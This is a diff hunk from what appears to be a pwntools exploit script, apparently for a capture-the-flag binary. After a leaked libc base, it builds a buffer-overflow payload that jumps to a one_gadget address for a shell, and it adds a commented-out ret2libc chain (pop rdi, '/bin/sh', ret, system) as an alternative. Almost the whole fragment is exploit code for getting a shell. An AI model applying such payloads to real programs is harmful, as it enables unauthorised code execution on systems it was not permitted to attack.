@@ -59,6 +59,10 @@ info("Libc base:%#x", libc.address)
 payload = flat({
     offset:[
         p64(libc.address + 0xe3b31) #onegadget
+        #pop_rdi,
+        #next(libc.search(b"/bin/sh\x00")),
+        #pop_rdi+1, #ret
+        #libc.sym['system']
     ]
     })
 
